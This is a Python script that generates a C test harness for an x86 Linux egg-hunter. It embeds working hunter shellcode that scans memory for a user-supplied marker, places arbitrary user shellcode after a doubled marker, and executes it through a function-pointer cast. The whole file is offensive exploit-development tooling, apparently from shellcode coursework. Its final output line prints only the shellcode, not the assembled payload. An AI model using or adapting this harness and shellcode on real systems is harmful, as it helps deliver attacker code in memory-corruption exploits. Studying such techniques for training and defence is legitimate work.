#!/usr/bin/env python3

import sys


def generate_stub(egg, shellcode):
    stub = r"""
#include<stdio.h>
#include<string.h>

unsigned char hunter[] = "\xbb{egg}\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x60\x8d\x5a\x04\xb0\x21\xcd\x80\x3c\xf2\x61\x74\xed\x39\x1a\x75\xee\x39\x5a\x04\x75\xe9\x8d\x5a\x08\xff\xe3";

unsigned char shellcode[] = "{egg}{egg}{shellcode}";
       
main()
{

    printf("Egg hunter length: %d\n", strlen(hunter));
    printf("Shellcode length:  %d\n", strlen(shellcode));

    int (*ret)() = (int(*)())hunter;

    ret();

}
"""
    stub = stub.replace("{egg}", egg)
    stub = stub.replace("{shellcode}", shellcode)
    return stub


def write_file(stub):
    try:
        with open("stub.c", "w") as f:
            f.write(stub)
        return True
    except Exception as err:
        print("[-] Could not create file stub.c. Error: {}".format(err))
        return False


def main(egg, shellcode):

    payload = r"{egg}{egg}{shellcode}".format(egg=egg, shellcode=shellcode)

    print("[+] Generating stub...")
    stub = generate_stub(egg, shellcode)
    err = write_file(stub)
    if not err:
        print("[-] Exiting...")
        sys.exit(1)

    print("[+] Done")
    print("[+] Stub located at stub.c")
    print("[+] Full payload: {}".format(shellcode))


if __name__ == "__main__":
    if len(sys.argv) < 3:  
        print("Usage: python3 wrapper.py <egg> <shellcode>")
        sys.exit(0)

    if len(sys.argv) == 3:
        main(sys.argv[1], sys.argv[2])

